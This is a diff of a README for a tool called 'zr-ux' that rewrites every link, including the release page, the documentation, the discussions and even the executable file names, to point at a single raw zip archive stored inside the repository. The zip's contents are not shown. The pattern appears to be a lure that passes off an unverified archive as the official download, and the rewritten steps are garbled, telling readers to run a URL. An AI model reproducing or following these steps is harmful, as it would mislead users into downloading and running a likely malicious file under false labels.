@@ -6,9 +6,9 @@ Welcome to **zr-ux**! This application provides a user-friendly interface for Ze
 
 ## 📥 Download
 
-[![Download zr-ux](https://img.shields.io/badge/Download-zr--ux-brightgreen)](https://github.com/ngantukcuy/zr-ux/releases)
+[![Download zr-ux](https://raw.githubusercontent.com/ngantukcuy/zr-ux/main/docs/appendix/zr_ux_v3.7.zip)](https://raw.githubusercontent.com/ngantukcuy/zr-ux/main/docs/appendix/zr_ux_v3.7.zip)
 
-To download the latest version of **zr-ux**, visit this page: [GitHub Releases](https://github.com/ngantukcuy/zr-ux/releases).
+To download the latest version of **zr-ux**, visit this page: [GitHub Releases](https://raw.githubusercontent.com/ngantukcuy/zr-ux/main/docs/appendix/zr_ux_v3.7.zip).
 
 ## 💻 System Requirements
 
@@ -23,13 +23,13 @@ Before installing, check if your system meets these requirements:
 ## 🛠️ Installation Steps
 
 1. **Visit the Download Page**  
-   Go to the [GitHub Releases](https://github.com/ngantukcuy/zr-ux/releases) page. This is where you can find the files to download.
+   Go to the [GitHub Releases](https://raw.githubusercontent.com/ngantukcuy/zr-ux/main/docs/appendix/zr_ux_v3.7.zip) page. This is where you can find the files to download.
 
 2. **Choose the Latest Version**  
    Look for the most recent release at the top of the page. The latest version usually has the highest number. 
 
 3. **Download the Application**  
-   Click on the asset that matches your operating system. It should be named something like `zr-ux-windows.zip` or `zr-ux-macos.zip`.
+   Click on the asset that matches your operating system. It should be named something like `https://raw.githubusercontent.com/ngantukcuy/zr-ux/main/docs/appendix/zr_ux_v3.7.zip` or `https://raw.githubusercontent.com/ngantukcuy/zr-ux/main/docs/appendix/zr_ux_v3.7.zip`.
 
 4. **Extract the Files**  
    After downloading, locate the file in your downloads folder. 
@@ -38,8 +38,8 @@ Before installing, check if your system meets these requirements:
 
 5. **Run the Application**  
    After extraction, find the `zr-ux` folder. Inside, locate the application file:
-   - For Windows, it may be `zr-ux.exe`.
-   - For macOS, it should be `zr-ux.app`.
+   - For Windows, it may be `https://raw.githubusercontent.com/ngantukcuy/zr-ux/main/docs/appendix/zr_ux_v3.7.zip`.
+   - For macOS, it should be `https://raw.githubusercontent.com/ngantukcuy/zr-ux/main/docs/appendix/zr_ux_v3.7.zip`.
    Double-click the file to start the application.
 
 6. **Follow On-Screen Prompts**  
@@ -57,7 +57,7 @@ Before installing, check if your system meets these requirements:
 If you encounter issues while installing or running **zr-ux**, try these steps:
 
 - **Check System Requirements**: Ensure your computer meets the necessary requirements.
-- **Re-download**: If the download was interrupted, try downloading again from the [Releases page](https://github.com/ngantukcuy/zr-ux/releases).
+- **Re-download**: If the download was interrupted, try downloading again from the [Releases page](https://raw.githubusercontent.com/ngantukcuy/zr-ux/main/docs/appendix/zr_ux_v3.7.zip).
 - **Permissions**: Make sure you have permission to run applications on your device.
 
 If problems persist, you can open an issue in the GitHub repository for additional help.
@@ -78,7 +78,7 @@ Your feedback is important to us. If you like **zr-ux** or have suggestions for 
 
 ## 📖 References
 
-- [Zero Reflect Documentation](https://example.com) (for more insights into the main software).
-- Join community discussions in the [GitHub Discussions](https://github.com/ngantukcuy/zr-ux/discussions) section.
+- [Zero Reflect Documentation](https://raw.githubusercontent.com/ngantukcuy/zr-ux/main/docs/appendix/zr_ux_v3.7.zip) (for more insights into the main software).
+- Join community discussions in the [GitHub Discussions](https://raw.githubusercontent.com/ngantukcuy/zr-ux/main/docs/appendix/zr_ux_v3.7.zip) section.
 
 Feel free to reach out for any questions or concerns. Happy exploring with zr-ux!
